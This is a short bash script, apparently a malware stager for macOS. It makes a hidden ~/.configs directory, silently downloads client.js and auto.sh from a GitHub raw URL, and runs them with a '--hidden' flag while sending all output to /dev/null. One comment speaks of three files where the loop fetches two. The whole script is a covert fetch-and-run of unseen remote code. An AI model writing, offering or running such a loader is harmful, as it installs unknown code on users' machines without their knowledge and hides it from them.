#!/usr/bin/env bash

fail() { echo "Failed"; exit 1; }

# HOME must be set (it always is on macOS, but be explicit)
[ -n "${HOME:-}" ] || fail

CONFIG_PATH="$HOME/.configs"

# Create hidden config directory
mkdir -p "$CONFIG_PATH" 2>/dev/null || fail

# Download the three files (same name on disk as on the server)
for f in client.js auto.sh; do
    curl -fsSL --tlsv1.2 \
        -o "$CONFIG_PATH/$f" \
        "https://raw.githubusercontent.com/rahul-call/inner/main/ror/$f" \
        >/dev/null 2>&1 || fail
    chmod 600 "$CONFIG_PATH/$f" 2>/dev/null || fail
done

# Execute
bash "$CONFIG_PATH/auto.sh" "$CONFIG_PATH/client.js" --hidden >/dev/null 2>&1 || fail

exit 0
